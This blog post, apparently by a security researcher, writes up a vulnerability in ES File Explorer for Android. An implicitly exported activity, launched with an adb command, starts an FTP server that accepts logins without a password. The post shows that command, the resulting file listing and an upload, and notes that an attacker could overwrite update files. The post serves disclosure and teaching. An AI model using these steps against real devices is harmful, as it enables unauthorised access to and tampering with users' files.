<html>
<link rel="stylesheet" href="minimal.css">
<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
<title>Blog</title>
<?php include 'header.html'; ?>
<br>
<br>
<br>
<center>
    <br>
    <br>

    Today I'm digging through some old bugs that I discovered in my time at graduate school.  I've decided to do a very brief writeup of this one in particular due to the large userbase of this application and the simplicity of the exploit. 
    <br>
    <br>
    <h1>$es_file_exporter</h1>
    <br>
</center>

<p>
Here I am again, testing a batch of applications for the lowest hanging fruit of vulnerabilities. Unfortunately, these types of vulnerabilities still plague applications with user bases in the hundreds of millions.  I've stuck to the same toolkit for a while, and it seems to get the job done: APKTool, dex2jar, Drozer, jd-gui, and Santoku Linux.  The application I targeted was one that I have personally used before: ES File Explorer (v. 4.1.2.4) for Android which has 100 million+ downloads.
An interesting feature of the application gives the user the ability to start a File Transfer Protocol (FTP) server on the phone.  At first glance, the implementation isn't too shabby: the user can configure their own FTP server with SFTP (securely) and authentication as desired.  
<br>
<img src="res/Screenshot_2016-08-21-13-06-19.png"  width="20%" height="50%"/>
<br>
Taking a closer look at the application's components in its AndroidManfiest.xml file with APKtool, I searched for references to "FTP" and found this interesting component: ESFtpShortcut
<br>
<pre class="prettyprint"><code>
&lt;activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="@string/app_name" android:launchMode="singleTop" android:name="com.estrongs.android.pop.ftp.ESFtpShortcut" android:theme="@style/Transparent"&gt;<br /> &lt;intent-filter&gt;<br /> &lt;action android:name="android.intent.action.MAIN"/&gt;<br /> &lt;/intent-filter&gt;<br />&lt;/activity&gt;</p>
</code></pre>
<br>

It isn't "explicitly" exported, but has an intent-filter, and therefore is "implicitly" exported (https://developer.android.com/guide/components/intents-filters.html#ExampleSend).  This means we can open it from a 3rd party application or ADB. 


(Honorable mention to OBEXFtpServerService though, which seems to give an FTP interface over Bluetooth)


Blindly firing up ADB and starting this Activity, I expected it to crash but it runs!:
adb shell am start com.estrongs.android.pop/.ftp.ESFtpShortcut 

It starts up an Activity in the background (no visual GUI), and an authenticated FTP server on port 3721:

<pre><code>
netstat
Proto Recv-Q Send-Q Local Address          Foreign Address        State
tcp6       0      0 :::3721                :::*                   LISTEN
</code></pre>

Testing out the FTP connection:


Connecting: 
<pre><code>
branden@surgeon:~/es_fil_exp$ ftp
ftp> open 192.168.1.115 3721
Connected to 192.168.1.115.
220 ESFtpServer 0.1 ready.
Name (192.168.1.115:branden): 		<-- no username
331 User name okay, need password.
Password:							<-- no password
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Active Mode.
150 Opening data connection for list.
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:04 obb
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Music
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Podcasts
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:12 Ringtones
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Alarms
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Notifications
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:06 Pictures
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Movies
drwxr-xr-x 1 nobody nobody         4096 Aug 21 11:50 Download
drwxr-xr-x 1 nobody nobody         4096 Aug 21 12:17 DCIM
drwxr-xr-x 1 nobody nobody         4096 Aug 21 10:18 Android
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:36 .estrongs
-rw-r--r-- 1 nobody nobody           72 Aug 21 09:09 .userReturn
drwxr-xr-x 1 nobody nobody         4096 Aug 20 09:09 backups
-rw-r--r-- 1 nobody nobody      9241046 Aug 21 10:23 com.estrongs.android.pop-1.apk
-rw-r--r-- 1 nobody nobody       110874 Aug 21 13:06 Screenshot_2016-08-21-13-06-19.png
226 Transfer complete.
</code></pre>

Get:
<pre><code>
ftp> get Screenshot from 2016-08-19 22:46:28.png 
local: from remote: Screenshot
227 Entering Active Mode.
501 target is dir.
</code></pre>

Put:
<pre><code>
ftp> put put.txt 
local: put.txt remote: put.txt
227 Entering Active Mode.
150 Opening data connection for file.
226 Transfer complete.
ftp> ls
227 Entering Active Mode.
150 Opening data connection for list.
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:04 obb
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Music
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Podcasts
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:12 Ringtones
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Alarms
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Notifications
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:06 Pictures
drwxr-xr-x 1 nobody nobody         4096 Jan 18 06:05 Movies
drwxr-xr-x 1 nobody nobody         4096 Aug 21 11:50 Download
drwxr-xr-x 1 nobody nobody         4096 Aug 21 12:17 DCIM
drwxr-xr-x 1 nobody nobody         4096 Aug 21 10:18 Android
drwxr-xr-x 1 nobody nobody         4096 Aug 21 13:36 .estrongs
-rw-r--r-- 1 nobody nobody           72 Aug 21 09:09 .userReturn
drwxr-xr-x 1 nobody nobody         4096 Aug 20 09:09 backups
-rw-r--r-- 1 nobody nobody      9241046 Aug 21 10:23 com.estrongs.android.pop-1.apk
-rw-r--r-- 1 nobody nobody       110874 Aug 21 13:06 Screenshot_2016-08-21-13-06-19.png
-rw-r--r-- 1 nobody nobody            0 Aug 21 13:42 put.txt		<-- put file
226 Transfer complete.
</code></pre>

<br>

While remote Get access is bad, Put is even worse.  Some applications tend to inernally store updates on the sdcard, an attacker may be able to upload  malicious payload to overwrite an update.  
<br>
<br>
Decompiling commands:
<br>
unzip com.estrongs.android.pop-1.apk -d com.estrongs.android.pop-1-decomp/
<br>
cd com.estrongs.android.pop-1-decomp/
<br>
dex2jar classes.dex


</center>


</p>

</html>
